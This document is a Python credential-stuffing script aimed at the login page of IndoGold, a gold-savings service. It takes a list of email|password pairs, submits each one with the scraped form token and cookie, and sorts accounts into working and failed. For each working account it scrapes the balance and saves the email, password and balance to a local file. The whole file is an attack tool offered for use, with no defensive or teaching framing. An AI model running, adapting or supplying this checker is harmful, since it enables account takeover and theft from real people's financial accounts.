#!/usr/bin/python3
#-*- heartscode.net -*-
#####..:[alert !]:..#####
#this tool absolutely harom
#DWYOR !
import requests,sys,argparse
from bs4 import BeautifulSoup as bs
from sty import fg,rs

argm = argparse.ArgumentParser()
argm.add_argument('-l','--list',help="list email+password with format email|pass",required=True)
args = argm.parse_args()

def ijo(str):
	return fg(34) + str + rs.fg
def abang(str):
	return fg.da_red + str + rs.fg
def simpen(result):
	f = open('IndoGold-account.txt','a+')
	f.write(result)
	f.close()
	return f
def cek(list):
	host = 'https://www.indogold.com/member/login'
	out = 'https://www.indogold.com/member/logout'
	headers = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0','Content-Type': 'application/x-www-form-urlencoded'}
	with requests.Session() as session:
		for i in range(len(list)):
			payload = {'user_email':list[i][0],'user_pass':list[i][1]}
			res = session.get(host)
			token = bs(res.text,'html.parser').input['value']
			if 'Set-Cookie' in res.headers:
				cookie_val = res.headers['Set-Cookie'].split(";")[0]
				headers['Cokiee'] = cookie_val
			payload['formtoken'] = token
			p = session.post(host,headers=headers,data=payload).text
			if 'Client Area' in p :
				scrap = bs(p,'html.parser').find_all('div',{"class": "client-membership-child"})
				result = []
				for a in scrap:
					val = a.find_all('span')
					print
					for v in val:
						result.append(v.contents[0])
				print(ijo(f"[Not Bad][Email : {list[i][0]}][pass : {list[i][1]}][Saldo : {result[2]}]"))
				r = list[i][0] +'|'+ list[i][1]+'|'+result[2]+'\n'
				simpen(r)
				session.get(out)
			else:
				print(abang(f"[Bad][Email : {list[i][0]}][pass : {list[i][1]}]"))
def main():
	try:
		op = open(args.list,'r').readlines()
		hps = [h.replace('\n','') for h in op]
		list = [p.split('|') for p in hps]
		cek(list)
	except KeyboardInterrupt:
		print("TRL+C detected, exiting.")
		sys.exit()

if __name__ == "__main__":
	main()